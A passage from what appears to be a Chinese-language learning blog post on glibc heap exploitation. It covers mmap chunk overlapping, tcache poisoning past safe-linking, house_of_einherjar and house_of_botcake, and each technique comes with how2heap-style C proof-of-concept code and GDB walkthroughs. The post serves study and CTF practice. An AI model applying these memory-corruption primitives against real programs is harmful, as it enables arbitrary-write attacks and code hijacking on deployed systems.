<p>在申请堆块前，vmmap 查看内存情况</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap.png" srcset="/img/loading.gif" lazyload></p>
<p>第一次 malloc 后，堆段被初始化，m1 被映射到 mmap 段。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-m1.png" srcset="/img/loading.gif" lazyload></p>
<p>此时分配的 m1 在 ld 的上方，也就是在比 ld 更高地址的地方。</p>
<p>第二次 malloc 后，我们可以发现两次的堆块位置不连续，且chunk_m2 的位置在 libc 之上，也就是 chunk_m2 地址比 libc 的地址低。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-m2.png" srcset="/img/loading.gif" lazyload></p>
<p>继续申请 0x100000 大小的 chunk_m3。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-m3.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来的 overlapping 是常规的方法，更改 <em>m3</em> 的 size 段为 <em>m2</em> 和 <em>m3</em> 的大小之和。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-m2-size.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-m2-size2.png" srcset="/img/loading.gif" lazyload></p>
<p>这样我们 free 掉 <em>m3</em> ，就会把 <em>m2</em>、<em>m3</em> 的整体内存部分归还给系统，我们此时查看 <code>mp_.mmap_threshold</code> 就变成了我们伪造的 chunk <em>m2</em> 的大小</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap_mp_mmap_threshold.png" srcset="/img/loading.gif" lazyload></p>
<p>我们再此申请一个堆块，需要注意，这时申请的堆块大小需要大于 0x202000 ，不然会分配到 heap 块去。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-m4.png" srcset="/img/loading.gif" lazyload></p>
<p>在 mmap_base 下方（实际上就是 libc 下方）。分配是在彼此下方连续进行的。所以 <em>m4</em> 的地址为：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x301000</span>-<span class="hljs-number">0</span>x202000=<span class="hljs-number">0</span>xFF000<br><span class="hljs-attribute">0x7ffff77df010</span>-<span class="hljs-number">0</span>xFF000=<span class="hljs-number">0</span>x7ffff76e0010<br></code></pre></td></tr></table></figure>

<p>内存中的布局：</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-ptr.png" srcset="/img/loading.gif" lazyload></p>
<p>这样我们就可以通过 <em>m4</em> 来覆写 <em>m2</em> 上的内存了</p>
<p>这个技术可以进一步利用，我们可以覆盖 mmap 映射段的内存，这块内存中同时也保存着 libc.so 文件的映射。free 掉这块 overlap 后的内存的同时也会清空这块内存的内容，那么就可以取消 libc 映射后通过重写符号表（symbol table）来劫持其他的函数地址到我们想要的system函数地址。</p>
<h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h1><p><strong>原理：</strong> 修改 tcache bin 中 chunk 的 next 指针，可以分配到任意地址。</p>
<p><strong>知识点✨：</strong></p>
<ul>
<li><p>tcache 也是使用 类似 bins 方式来管理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span>  </span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="hljs-comment">// TCACHE_MAX_BINS = 64</span><br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure>

<p>每一项 <code>tcache_perthread_struct</code> 由相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接。</p>
<p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p>
<p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p>
</li>
<li><p>glibc2.32 之后引入了 PROTECT_PTR 地址保护，应用在 tcache bin 和 fast bin 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">   larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">   still works.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br> <br> <br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br> <br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache_key;<br> <br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>也就是说，<code>e-&gt;next</code> 最终指向了 <code>e-&gt;next</code> 地址右移 12 位后的值与当前 <code>tcache</code> 头指针值异或后的值。</p>
</li>
</ul>
<blockquote>
<p>源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br>&gt;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&gt;&#123;<br>&gt;<span class="hljs-type">size_t</span> <span class="hljs-built_in">stack</span>[<span class="hljs-number">0x10</span>];<br>&gt;<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>&gt;<span class="hljs-keyword">while</span> ((<span class="hljs-type">long</span>)&amp;<span class="hljs-built_in">stack</span>[i]&amp;<span class="hljs-number">0xf</span>) i++;<br>&gt;<span class="hljs-type">size_t</span> *target = &amp;<span class="hljs-built_in">stack</span>[i];<br>&gt;<span class="hljs-type">size_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>&gt;<span class="hljs-type">size_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>&gt;<span class="hljs-built_in">free</span>(a);<br>&gt;<span class="hljs-built_in">free</span>(b);<br>&gt;b[<span class="hljs-number">0</span>] = (<span class="hljs-type">size_t</span>)((<span class="hljs-type">long</span>)target ^ ((<span class="hljs-type">long</span>)b &gt;&gt; <span class="hljs-number">12</span>));<br>&gt;<span class="hljs-type">size_t</span> * xx = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>&gt;<span class="hljs-type">size_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>&gt;assert( c == target);<br>&gt;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&gt;&#125;<br></code></pre></td></tr></table></figure>
</blockquote>
<p><strong>GDB 调试</strong></p>
<p>首先申请了一个 0x10 大小的堆块，并检查地址是否 0x10 字节对齐，这个数组就是为了找到一个对其的地址。</p>
<p>因为申请和释放的地址必须是 0x10 字节对齐的，<strong>如果要覆盖为我们任意的地址，那么这个任意地址也应该要对齐</strong>。检查到一个对齐的就可以 break 了。</p>
<blockquote>
<p>0xf 的二进制为 1111 ，如果地址是 0x10 对齐，那么最后 4 位二进制位应该是 0000 。所以 <code>&amp;0xf</code> 就是取最后四位二进制位进行与运算，如果运算结果是 0 ，那么证明检测地址的最后 4 位二进制位应该是 0000，即0x10 对齐。</p>
</blockquote>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_poison_stack.png" srcset="/img/loading.gif" lazyload></p>
<p>这样stack[1] 就可以被 target 用掉，经验证也的确如此：</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_poison_target.png" srcset="/img/loading.gif" lazyload></p>
<p>接着我们申请两个堆块，再 free 掉</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_poison_free2.png" srcset="/img/loading.gif" lazyload></p>
<p>这里的 fd 指针实际上就是 next 指针</p>
<p>接下来修改 <code>b-&gt;next</code> ，原本是指向 a 的地址，修改成 target_addr 。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_poison_free.png" srcset="/img/loading.gif" lazyload></p>
<p>我们再申请两个chunk， b 被分配出去后，随后就会分配 <code>b-&gt;next</code> 指针指向的栈上的地址。</p>
<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h1><blockquote>
<p>不太懂，等着之后补充一下吧😢</p>
</blockquote>
<p><strong>原理：</strong>通过溢出覆盖物理相邻高地址的 <code>prev_size</code> 和 <code>prev_inuse</code> 位， free 的时候就会触发合并与 unlink ，而合并的 size 是由我们自己控制的。也就是说如果我们可以同时控制一个 chunk <code>prev_size</code> 与 <code>prev_inuse</code> 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</p>
<p><strong>知识点✨：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>    &amp;&amp; tcache<br>    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        victim = tcache_get (tc_idx);<br>        <span class="hljs-keyword">return</span> tag_new_usable (victim);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>在从 tcache bin 取出 chunk 的检测中，不再是 <code>tcache-&gt;entries[tc_idx] &gt; 0</code>，而是 <code>tcache-&gt;counts[tc_idx] &gt; 0</code>。</p>
<blockquote>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br>&gt;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&gt;&#123;<br>&gt;<span class="hljs-type">size_t</span> *x[<span class="hljs-number">7</span>];<br>&gt;<span class="hljs-type">size_t</span> <span class="hljs-built_in">stack</span>[<span class="hljs-number">16</span>],i = <span class="hljs-number">0</span>;<br>&gt;<span class="hljs-keyword">while</span> ((<span class="hljs-type">long</span>)&amp;<span class="hljs-built_in">stack</span>[i]&amp;<span class="hljs-number">0xf</span>) i++;<br>&gt;<span class="hljs-type">size_t</span> *target = &amp;<span class="hljs-built_in">stack</span>[i];<br>&gt;<span class="hljs-type">size_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>&gt;a[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;    <span class="hljs-comment">// prev_size (Not Used)</span><br>&gt;a[<span class="hljs-number">1</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// size</span><br>&gt;a[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// prepare fwd == bck for unlink</span><br>&gt;a[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">//</span><br>&gt;<span class="hljs-type">u_int8_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>&gt;<span class="hljs-type">u_int8_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf0</span>);<br>&gt;b[<span class="hljs-number">0x20</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// set c prevsize</span><br>&gt;b[<span class="hljs-number">0x28</span>] = <span class="hljs-number">0</span>;    <span class="hljs-comment">// null byte of c size&#x27;s least significant byte</span><br>&gt;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf0</span>);<br>&gt;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">free</span>(x[i]);<br>&gt;<span class="hljs-built_in">free</span>(c);  <span class="hljs-comment">// tcache is full so consolidate with our fake chunk then go into unsortbin</span><br>&gt;<span class="hljs-type">size_t</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>); <span class="hljs-comment">//cash out from unsortbin</span><br>&gt;<span class="hljs-type">void</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>); <span class="hljs-comment">// free one more chunk to bypass</span><br>&gt;<span class="hljs-built_in">free</span>(pad);<br>&gt;<span class="hljs-built_in">free</span>(b);<br>&gt;d[<span class="hljs-number">0x30</span>/<span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>)target ^ ((<span class="hljs-type">long</span>)&amp;d[<span class="hljs-number">0x30</span>/<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">12</span>); <span class="hljs-comment">//posion tcache  point to target</span><br>&gt;<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>); <span class="hljs-comment">//cash out b</span><br>&gt;assert(<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>) == target);<br>&gt;&#125;<br></code></pre></td></tr></table></figure>
</blockquote>
<p><strong>GDB 调试</strong></p>
<p>我们先找一个合适的 target 地址，然后申请一个堆块，并在其中构造 fake chunk 。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_einherjar_free2.png" srcset="/img/loading.gif" lazyload></p>
<p>需要注意这里的指针检查的绕过只需要 <code>p-&gt;fd=p</code>、<code>p-&gt;bk=p</code> 。</p>
<p>我们再申请两个堆块，同时修改对应的 <code>prev_size</code> 和 <code>prev_inuse</code> 位，把 <code>prev_size</code> 修改成 0x60，<code>prev_inuse</code> 由 1 修改成 0 。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_einherjar_malloc2.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来我们填满 tcachebin ，再 <code>free(c)</code></p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_einherjar_free3.png" srcset="/img/loading.gif" lazyload></p>
<p>这样 chunk c 就会触发后向合并，进入 unsortedbin。这样之后，我们再申请的堆块地址就会是 <code>chunk_a-0x10</code>。</p>
<p>除此之外，我们需要利用到 tcache bin ，所以我们要把 chunk_b 放进 tcache bin。首先申请一个堆块再释放用来填充 <code>tcache-&gt;counts</code> 数组</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_einherjar_padding.png" srcset="/img/loading.gif" lazyload></p>
<p>随后我们修改 chunk_b的 fd 指针为 target_addr，这样第二个申请到的 chunk 就是 target_addr。</p>
<h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h1><p><strong>原理：</strong>令 chunk 存在于两个 bin 中，即 double free 。再利用 overlap chunk 可以修改 tcache bin 中 double free chunk 的 <em>fd</em> 指针，这样再次申请 malloc 的时候就会申请到目标地址。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br>&gt;<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br>&gt;<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&gt;&#123;<br>&gt;<span class="hljs-type">size_t</span> stack_var[<span class="hljs-number">4</span>];<br>&gt;<span class="hljs-type">size_t</span> *x[<span class="hljs-number">7</span>];<br>&gt;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-type">size_t</span> *prev = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-type">size_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//padding chunk or will double free</span><br>&gt;<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">free</span>(x[i]);<br>&gt;<span class="hljs-built_in">free</span>(a);  <span class="hljs-comment">// a in unsorted bin</span><br>&gt;<span class="hljs-built_in">free</span>(prev);<br>&gt;<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-built_in">free</span>(a);  <span class="hljs-comment">// a in tcache</span><br>&gt;<span class="hljs-type">size_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xb0</span>);<br>&gt;b[<span class="hljs-number">0x90</span>/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = (<span class="hljs-type">size_t</span>)((<span class="hljs-type">long</span>)stack_var ^ ((<span class="hljs-type">long</span>)a &gt;&gt; <span class="hljs-number">12</span>));<span class="hljs-comment">// poison tcache</span><br>&gt;<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;<span class="hljs-type">size_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>&gt;assert(c == stack_var);<br>&gt;&#125;<br></code></pre></td></tr></table></figure>
</blockquote>
<p><strong>GDB 调试</strong></p>
<p>开头的部分就是后续填充 tcachebin 的chunk。其中申请的数组 stack_var 用来模拟我们希望控制的地址。</p>
<p>我们申请一个堆块 <em>prev</em> 用来 overlap ，再申请一个堆块 <em>a</em> ，这就是我们将要利用的堆块。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/botcake_prev_a.png" srcset="/img/loading.gif" lazyload></p>
<p>填充 tcachebin 之后我们 free 堆块 <em>a</em> ，<em>a</em> 会进入 unsortedbin 。再次 free <em>prev</em>  的时候，就会触发 <code>consolidate forward</code>，与物理相邻的高地址 chunk <em>a</em> 进行合并。</p>
<p>这时候从 tcachebin 中申请一个 0x80 大小的 chunk，让 tcachebin 空出一个位置。再 free <em>a</em> （double free）的时候 chunk <em>a</em> 就会进入 tcachebin 链的头部。</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/botcake_free_a.png" srcset="/img/loading.gif" lazyload></p>
<p>这样我们就造成了堆块 a 的堆叠。此时堆块 prev 部分的内存布局如下：</p>
<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/botcake_prev.png" srcset="/img/loading.gif" lazyload></p>
<p>这样我们就可以利用堆叠的漏洞修改 chunk a 的 fd、bk 指针为我们想要的地址（stack 的地址），这样，我们就把目标地址链入了 tcachebin。</p>
<p>下边的利用就一样啦！申请两次就可以申请到 stack 啦🤗</p>
<hr>
<p>脑子转不动了，先学到这里😢</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Knowledge/">#Knowledge</a>
      
        <a href="/tags/heap/">#heap</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>how2heap深入浅出学习堆利用(二)</div>
      <div>https://shmodifier.github.io/2024/03/05/how2heap深入浅出学习堆利用-二/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Modifier</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年3月5日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
                    <i class="iconfont icon-sa"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/03/02/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/" title="how2heap深入浅出学习堆利用(一)">
                        <span class="hidden-mobile">how2heap深入浅出学习堆利用(一)</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

